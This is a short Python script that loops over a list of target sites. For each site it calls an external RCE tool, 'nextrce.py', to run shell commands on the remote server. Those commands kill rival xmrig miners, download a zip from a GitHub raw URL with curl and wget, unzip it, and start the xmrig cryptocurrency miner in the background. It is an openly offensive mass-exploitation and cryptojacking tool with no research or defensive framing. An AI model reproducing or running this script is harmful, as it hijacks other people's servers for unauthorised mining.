import subprocess

SITELIST = "z.txt"

commands = [
    "pkill -9 -f xmrig",
    "mkdir zxx",
    "apt install wget -y",
    "apt install curl -y",
    "curl -L https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip -o zxx/zzx.zip > wget.log 2>&1",
    "wget -O zxx/zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip > wget.log 2>&1",
    "apt install unzip",
    "unzip zxx/zzx.zip",
    "chmod +x xmrig",
    "nohup ./xmrig --config config.json >> zzx.log 2>&1 &",
    "ps aux | grep xmrig"
]

with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

for url in sites:
    print(f"[+] Processing {url}")
    for cmd in commands:
        full_command = [
            "python3", "nextrce.py",
            "-u", url,
            "-c", cmd
        ]
        subprocess.run(full_command)
    print(f"[+] Done {url}\n")
